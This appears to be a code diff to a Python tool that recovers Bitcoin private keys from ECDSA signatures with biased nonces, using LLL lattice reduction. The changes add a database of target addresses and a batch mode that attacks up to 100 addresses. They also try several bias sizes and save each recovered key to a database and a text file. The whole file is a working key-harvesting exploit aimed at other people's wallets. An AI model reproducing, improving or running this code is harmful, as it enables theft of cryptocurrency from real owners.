@@ -6,7 +6,7 @@ import pandas as pd
 import re
 import base58
 from ecdsa import SigningKey, SECP256k1
-from tx_preimage_reconstructor import extract_sigs_with_real_z
+from db_manager import get_signatures, add_recovered_key, get_target_addresses, mark_analyzed
 
 # --- Simple Bech32 Implementation ---
 CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
@@ -62,8 +62,10 @@ def verify_key(d, address):
     Supports Legacy (1...) and SegWit v0 (bc1q...).
     """
     try:
-        d_bytes = int(d).to_bytes(32, 'big')
-        sk = SigningKey.from_secret_string(d_bytes, curve=SECP256k1)
+        # Convert to hex string, remove 0x prefix, and pad to 64 chars
+        d_hex = hex(int(d))[2:].zfill(64)
+        d_bytes = bytes.fromhex(d_hex)
+        sk = SigningKey.from_string(d_bytes, curve=SECP256k1)
         vk = sk.verifying_key
         
         # Uncompressed Legacy
@@ -75,6 +77,7 @@ def verify_key(d, address):
         
         return address in [addr_uncompressed, addr_compressed, addr_segwit]
     except Exception as e:
+        print(f"Error in verify_key: {e}")
         return False
 
 def pubkey_to_address(pubkey_bytes):
@@ -90,21 +93,24 @@ def pubkey_to_segwit_address(pubkey_bytes):
     converted = convertbits(ripemd160, 8, 5)
     return bech32_encode('bc', [0] + converted)
 
+import mpmath
+mpmath.mp.prec = 512
+
 def lll_reduction(basis):
     """
-    Standard LLL implementation.
+    Standard LLL implementation using mpmath for high precision.
     """
     n = len(basis)
     m = len(basis[0])
-    mu = [[0.0 for _ in range(n)] for _ in range(n)]
-    b_star = [[0.0 for _ in range(m)] for _ in range(n)]
-    d = [0.0] * n
+    mu = [[mpmath.mpf(0) for _ in range(n)] for _ in range(n)]
+    b_star = [[mpmath.mpf(0) for _ in range(m)] for _ in range(n)]
+    d = [mpmath.mpf(0)] * n
 
     def update_orthogonalization(i):
-        b_star[i] = basis[i][:]
+        b_star[i] = [mpmath.mpf(x) for x in basis[i]]
         for j in range(i):
-            num = sum(basis[i][k] * b_star[j][k] for k in range(m))
-            mu[i][j] = num / d[j] if d[j] != 0 else 0
+            num = sum(b_star[i][k] * b_star[j][k] for k in range(m))
+            mu[i][j] = num / d[j] if d[j] != 0 else mpmath.mpf(0)
             for k in range(m):
                 b_star[i][k] -= mu[i][j] * b_star[j][k]
         d[i] = sum(x**2 for x in b_star[i])
@@ -116,7 +122,7 @@ def lll_reduction(basis):
     while k < n:
         for j in range(k-1, -1, -1):
             if abs(mu[k][j]) > 0.5:
-                q = round(mu[k][j])
+                q = int(round(mu[k][j]))
                 for l in range(m):
                     basis[k][l] -= q * basis[j][l]
                 update_orthogonalization(k)
@@ -131,6 +137,11 @@ def lll_reduction(basis):
     return basis
 
 def solve_hnp(sigs_data, bias_bits, address=None):
+    # Limit number of signatures to avoid slow LLL reduction
+    max_n = 32
+    if len(sigs_data) > max_n:
+        sigs_data = sigs_data[:max_n]
+    
     n = len(sigs_data)
     if n < 2: return None
     B = 2**(256 - bias_bits) 
@@ -159,26 +170,42 @@ def solve_hnp(sigs_data, bias_bits, address=None):
     return None
 
 def run_lattice_recovery(address, bias_bits=8):
-    sigs = extract_sigs_with_real_z(address)
+    sigs = get_signatures(address)
     if len(sigs) >= 2:
         print(f"Attempting recovery for {address} with {len(sigs)} sigs ({bias_bits} bits)...")
         key = solve_hnp(sigs, bias_bits, address=address)
         if key:
+            key_hex = hex(key)[2:].zfill(64)
             print(f"!!! REAL SUCCESS: Key found for {address} !!!")
-            print(f"Private Key: {hex(key)}")
+            print(f"Private Key: {key_hex}")
+            add_recovered_key(address, key_hex, method='Lattice')
             with open("keys_recovered.txt", "a") as f:
-                f.write(f"Address: {address} | Key: {hex(key)}\n")
+                f.write(f"Address: {address} | Key: {key_hex}\n")
             return key
+    else:
+        print(f"Not enough signatures for {address} (need at least 2, have {len(sigs)})")
     return None
+
+def batch_analyze():
+    addresses = get_target_addresses(limit=100, only_unprocessed=False)
+    print(f"Starting batch analysis for {len(addresses)} addresses...")
+    for addr in addresses:
+        # Try different bias bits
+        for bias in [8, 12, 16, 20]:
+            if run_lattice_recovery(addr, bias_bits=bias):
+                break # Found the key, move to next address
 
 if __name__ == "__main__":
     import sys
     if len(sys.argv) < 2:
-        print("Usage: python3 lattice_nonce_analyzer.py <address> [bias_bits]")
+        print("Usage: python3 lattice_nonce_analyzer.py <address|batch> [bias_bits]")
         sys.exit(1)
     
-    address = sys.argv[1]
-    bias_bits = int(sys.argv[2]) if len(sys.argv) > 2 else 8
-    
-    print(f"Starting lattice analysis for {address}...")
-    run_lattice_recovery(address, bias_bits=bias_bits)
+    cmd = sys.argv[1]
+    if cmd == "batch":
+        batch_analyze()
+    else:
+        address = cmd
+        bias_bits = int(sys.argv[2]) if len(sys.argv) > 2 else 8
+        print(f"Starting lattice analysis for {address}...")
+        run_lattice_recovery(address, bias_bits=bias_bits)
